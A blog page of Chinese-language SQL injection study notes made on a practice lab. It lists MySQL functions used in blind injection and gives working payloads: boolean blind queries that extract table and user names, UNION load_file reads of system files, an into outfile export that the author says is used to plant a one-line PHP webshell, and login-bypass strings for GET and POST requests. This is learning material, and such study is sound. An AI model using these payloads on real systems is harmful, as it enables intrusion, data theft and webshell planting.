@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="说实话，渗透一团糟，现在必须补上渗透的知识，不然以后怎么办嘛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://example.com/2020/04/27/07_%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/2020-04-27-SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="说实话，渗透一团糟，现在必须补上渗透的知识，不然以后怎么办嘛">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-27T09:40:01.000Z">
+<meta property="article:modified_time" content="2020-04-29T04:11:30.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="渗透笔记">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2020/04/27/07_%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/2020-04-27-SQL%E6%B3%A8%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SQL注入 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/04/27/07_%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/2020-04-27-SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-27 17:40:01" itemprop="dateCreated datePublished" datetime="2020-04-27T17:40:01+08:00">2020-04-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-29 12:11:30" itemprop="dateModified" datetime="2020-04-29T12:11:30+08:00">2020-04-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">渗透学习</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>说实话，渗透一团糟，现在必须补上渗透的知识，不然以后怎么办嘛</p>
+</blockquote>
+<a id="more"></a>
+
+<h1 id="SQL注入说明"><a href="#SQL注入说明" class="headerlink" title="SQL注入说明"></a>SQL注入说明</h1><ul>
+<li>列举如下：<ol>
+<li>理解SQL注入基本原理与实现方式，以及常见的注入操作。</li>
+<li>学习SQL注入之前需要先学习基本的SQL语句，http基本的get与post请求，url编码。</li>
+<li>本笔记连贯性不强，不够系统，但都是重要且需要理解的点。</li>
+<li>使用Sqlilab边学习边实践</li>
+</ol>
+</li>
+</ul>
+<h1 id="SQL注入的函数积累"><a href="#SQL注入的函数积累" class="headerlink" title="SQL注入的函数积累"></a>SQL注入的函数积累</h1><h2 id="mysql常用hack函数"><a href="#mysql常用hack函数" class="headerlink" title="mysql常用hack函数"></a>mysql常用hack函数</h2><ul>
+<li><p>mid</p>
+<blockquote>
+<p>从字符串 s 的 n 位置截取长度为 len 的子字符串，同 SUBSTRING(s,n,len)</p>
+</blockquote>
+<p>示例：从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MID</span>(<span class="string">&quot;RUNOOB&quot;</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="keyword">AS</span> ExtractString; <span class="comment">-- UNO</span></span><br></pre></td></tr></table></figure></li>
+<li><p>LEFT(str,len)</p>
+<blockquote>
+<p>返回字符串str的最左面len个字符</p>
+</blockquote>
+<p>示例：返回字符串 runoob 中的前两个字符：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="string">&#x27;runoob&#x27;</span>,<span class="number">2</span>) <span class="comment">-- ru</span></span><br></pre></td></tr></table></figure></li>
+<li><p>ASCII(str)</p>
+<blockquote>
+<p>返回字符串 str 的第一个字符的 ASCII 码。。如果str是空字符串，返回0。如果str是NULL，返回NULL</p>
+</blockquote>
+<p>示例：返回 CustomerName 字段第一个字母的 ASCII 码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">ASCII</span>(CustomerName) <span class="keyword">AS</span> NumCodeOfFirstChar</span><br><span class="line"><span class="keyword">FROM</span> Customers;</span><br></pre></td></tr></table></figure></li>
+<li><p>SUBSTR(str,pos,len)</p>
+<blockquote>
+<p>从str中多少个字符开始，截取多少位</p>
+</blockquote>
+<p>示例：从字符串 RUNOOB 中的第 2 个位置截取 3个 字符：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUBSTR</span>(<span class="string">&quot;RUNOOB&quot;</span>, <span class="number">2</span>, <span class="number">3</span>) <span class="keyword">AS</span> ExtractString; <span class="comment">-- UNO</span></span><br></pre></td></tr></table></figure></li>
+<li><p>CAST(x AS type)</p>
+<blockquote>
+<p>转换数据类型</p>
+</blockquote>
+<p>字符串日期转换为日期：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CAST</span>(<span class="string">&quot;2017-08-29&quot;</span> <span class="keyword">AS</span> <span class="built_in">DATE</span>); <span class="comment">-- 2017-08-29</span></span><br></pre></td></tr></table></figure></li>
+<li><p>IFNULL(expr1,expr2)</p>
+<blockquote>
+<p>如果expr1不是NULL，IFNULL()返回expr1，否则它返回expr2</p>
+</blockquote>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="literal">null</span>,<span class="string">&#x27;Hello Word&#x27;</span>) <span class="comment">-- Hello Word</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="判断字符的一些语句："><a href="#判断字符的一些语句：" class="headerlink" title="判断字符的一些语句："></a>判断字符的一些语句：</h2><ul>
+<li>```sql<br>left(database(),1)&gt;’s’ //left()函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  说明:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</span><br><span class="line">- &#96;&#96;&#96;sql</span><br><span class="line">  ascii(</span><br><span class="line">    substr(</span><br><span class="line">      (select table_name from information_schema.tables where table_schema &#x3D;database()limit 0,1), 1, 1)</span><br><span class="line">      ) &#x3D; 101 –+ &#x2F;&#x2F;substr()函数，ascii()函数</span><br></pre></td></tr></table></figure>
+说明:substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值</li>
+<li><pre><code class="sql">ascii(substr((select database()),1,1))=98
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- &#96;&#96;&#96;sql</span><br><span class="line">  ORD(</span><br><span class="line">    MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1)</span><br><span class="line">    )&gt;98%23 &#x2F;&#x2F;ORD()函数，MID()函数</span><br></pre></td></tr></table></figure>
+说明:mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位
+Ord()函数同 ascii()，将字符转为 ascii 值
+
+
+</code></pre>
+</li>
+</ul>
+<h2 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE"></a>LOAD_FILE</h2><h3 id="加载本地文件（服务器上）"><a href="#加载本地文件（服务器上）" class="headerlink" title="加载本地文件（服务器上）"></a>加载本地文件（服务器上）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>))</span><br></pre></td></tr></table></figure>
+<p>说明：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(<span class="number">0x633a2f626f6f742e696e69</span>)</span><br></pre></td></tr></table></figure>
+<p>说明：“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(‘c:\\wamp\\<span class="keyword">bin</span>\\mysql\\mysql5<span class="number">.6</span><span class="number">.17</span>\\my.ini’) <span class="keyword">into</span> <span class="keyword">outfile</span> ‘c:\\wamp\\www\\test.php’</span><br></pre></td></tr></table></figure>
+<p>可以将其他路径的文件导到web目录来供访问，一般用于把包含一句话木马的文件导出成php来链接</p>
+<h1 id="get与post请求注释符的区别"><a href="#get与post请求注释符的区别" class="headerlink" title="get与post请求注释符的区别"></a>get与post请求注释符的区别</h1><ul>
+<li>一般很容易在各种教程上看到 ‘ or and 1=1 #  或 ‘ or and 1=1 –+ ，但可能没人告诉你什么情况下该用什么。</li>
+<li>#是sql语句中的注释符，+ 在http请求中表示空格，但get与post中，由于http请求的转义，请求到后端sql语句拼接的时候可能会不一样。</li>
+<li>get请求的时候一般用:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1′ and 1=1 –+</span><br></pre></td></tr></table></figure></li>
+<li>这里最后的空格用+，在请求的时候不会被urlencode，到后端sql语句中就会成为一个正常的空格，– 后面的语句就会被注释。</li>
+<li>但是如果在post里最后用加号的话就会被urlencode成%2B，实际的空格被转义才被转义成+</li>
+<li>post请求的时候一般用：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1%27+or+1%3D1+<span class="comment">--%2B&amp;passwd=111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure></li>
+<li>这时候，在post的情况下，最后一个空格，可以直接用空格，不用+来代替，因为post参数 空格会自动转成+；</li>
+<li>而之所以不在get注入的时候使用“#”来注释，是因为，请求时，“#”不会被urlencode为“%23”，被识别为锚链接，无法传递至sql语句中。</li>
+<li>找一个库中有哪些表名：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema <span class="keyword">where</span> table_schema =<span class="string">&quot;security&quot;</span>;</span><br></pre></td></tr></table></figure></li>
+<li>找一个表中有哪些列名：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema <span class="keyword">where</span> table_name =<span class="string">&quot;eamils&quot;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" rel="tag"># 渗透笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/20/06_%E6%80%BB%E7%BB%93/%E6%90%AD%E5%BB%BAUbuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/" rel="prev" title="搭建Ubuntu虚拟机的注意事项">
+      <i class="fa fa-chevron-left"></i> 搭建Ubuntu虚拟机的注意事项
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/28/07_%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/2020-04-28-HTML%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/" rel="next" title="HTML数据流分析">
+      HTML数据流分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%AF%B4%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">SQL注入说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%BD%E6%95%B0%E7%A7%AF%E7%B4%AF"><span class="nav-number">2.</span> <span class="nav-text">SQL注入的函数积累</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E5%B8%B8%E7%94%A8hack%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">mysql常用hack函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E7%AC%A6%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AF%AD%E5%8F%A5%EF%BC%9A"><span class="nav-number">2.2.</span> <span class="nav-text">判断字符的一些语句：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LOAD-FILE"><span class="nav-number">2.3.</span> <span class="nav-text">LOAD_FILE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%EF%BC%89"><span class="nav-number">2.3.1.</span> <span class="nav-text">加载本地文件（服务器上）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get%E4%B8%8Epost%E8%AF%B7%E6%B1%82%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.</span> <span class="nav-text">get与post请求注释符的区别</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">83</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
